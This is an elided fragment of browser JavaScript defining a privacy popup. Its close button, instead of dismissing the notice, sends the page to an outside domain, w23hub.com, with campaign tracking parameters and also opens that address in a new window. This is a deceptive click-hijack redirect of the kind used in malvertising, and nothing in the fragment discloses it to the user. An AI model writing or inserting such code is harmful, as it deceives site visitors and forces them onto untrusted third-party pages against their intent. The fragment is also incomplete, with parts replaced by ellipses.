(function(){
  ...
  function showPrivacyPopup(context){
    ...
    if(close)  close.addEventListener('click', ()=>{ window.location.href='http://w23hub.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]'; try{ window.open('http://w23hub.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]','http://w23hub.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]'); }catch(e){} });
  }
